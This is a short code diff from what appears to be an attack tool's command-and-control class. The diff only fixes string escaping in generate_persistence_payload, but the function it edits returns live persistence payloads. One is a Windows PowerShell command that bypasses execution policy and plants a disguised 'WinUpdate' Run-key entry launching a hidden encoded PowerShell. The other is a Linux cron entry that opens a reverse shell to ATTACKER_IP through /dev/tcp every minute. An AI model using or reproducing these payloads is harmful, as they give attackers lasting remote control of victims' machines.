@@ -558,7 +558,7 @@ class AdvancedCommandCenter:
     def generate_persistence_payload(self, platform: str = "windows") -> str:
         """Generate persistence mechanism."""
         if platform.lower() == "windows":
-            return '''powershell -NoProfile -ExecutionPolicy Bypass -Command "$reg='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run';Set-ItemProperty $reg 'WinUpdate' 'cmd /c start powershell -w hidden -e JABjAGwA...';Set-ItemProperty $reg 'WinUpdate' (Get-Content 'C:\Windows\System32\calc.exe' -Raw)"'''
+            return r'''powershell -NoProfile -ExecutionPolicy Bypass -Command "$reg='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run';Set-ItemProperty $reg 'WinUpdate' 'cmd /c start powershell -w hidden -e JABjAGwA...';Set-ItemProperty $reg 'WinUpdate' (Get-Content 'C:\Windows\System32\calc.exe' -Raw)"'''
         else:
             return '''echo '* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /etc/cron.d/persistence'''
     
